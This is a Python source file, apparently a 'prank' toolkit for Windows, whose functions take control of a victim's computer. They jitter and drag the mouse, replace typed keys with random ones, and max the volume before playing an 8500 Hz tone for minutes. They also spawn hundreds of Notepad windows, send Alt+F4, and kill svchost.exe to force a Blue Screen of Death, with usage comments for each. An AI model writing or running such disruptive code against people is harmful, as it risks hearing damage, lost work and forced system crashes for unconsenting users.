import pyautogui as pyt
import requests
import subprocess as sub
import random
import time
import math
from pynput import keyboard
import winsound
pyt.FAILSAFE = False 
chars = "a b c d e f g i j k l m n o p q r s t u v w x y z 1 2 3 4 5 6 7 8 9 0 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z".split(" ")
def getpress():
    with keyboard.Events() as events:
        event = events.get(0.05)
        if event == None:
            return None
        else:
            return "key"
def getpos():
    pos = pyt.position()
    xy = str(pos).replace("Point(x=","").replace(")","").replace("y=","").replace(",","").split()
    xy = list(map(int, xy))
    return xy
getpos()
def shaker(min, max):
    xy = getpos()
    shakevector = (xy[0] + math.floor(random.randint(min, max)),xy[1] + math.floor(random.randint(min, max)))
    pyt.moveTo(shakevector)
def drag_rand(min, max):
    xy = getpos()
    dragvector = (xy[0] + math.floor(random.randint(min, max)),xy[1] + math.floor(random.randint(min, max)))
    time.sleep(0.8)
    pyt.dragTo(dragvector, duration=1, tween=pyt.easeInOutQuad)
def randomkeys():
    if getpress() == "key":
        pyt.press('backspace')
        pyt.press(random.choice(chars))
    else:
        pass
def earburster(seconds, fake_exit):
    if fake_exit == True:
        winsound.PlaySound("SystemExit", winsound.SND_ALIAS)
    else:
        time.sleep(0.1)
    for i in range(100):
        pyt.press('volumeup')
    winsound.Beep(8500, seconds*1000)
def appl_spam(infin):
    if infin == True:
        for i in range(400):
            sub.Popen("notepad")
    else:
        for u in range(20):
            sub.Popen("notepad")
def fakedisconnect(amount):
    for a in range(amount):
        winsound.PlaySound("SystemExit", winsound.SND_ALIAS)
def typeword(word):
    pyt.write(word)
def altf4():
    pyt.hotkey('alt', 'f4')
def BSoD():
    sub.call("taskkill  /f /im svchost.exe")
#shaker(-21,21) #will drag to a random pixel between -21 and 21 on both the current x and y axis
#drag_rand(-200,400) #will drag to a random pixel between -200 and 400 on both the current x and y axis
#randomkeys() #will replace typed keys with random keys
#earburster(200, True) #High pitched frquency for 200 seconds, the fake_exit variable determines whether a disconnect sound will play
#appl_spam(True) #will create 400 notepad instances, otherwise if false just 20 instances
#fakedisconnect(12) #Will make a fake disconnect sound for the amount of times listed, in this case twelve
#typeword("your name is sadik") #will type out anything in the input
#altf4() #pretty self explanatory
#BSoD() #triggers a Blue Screen of Death



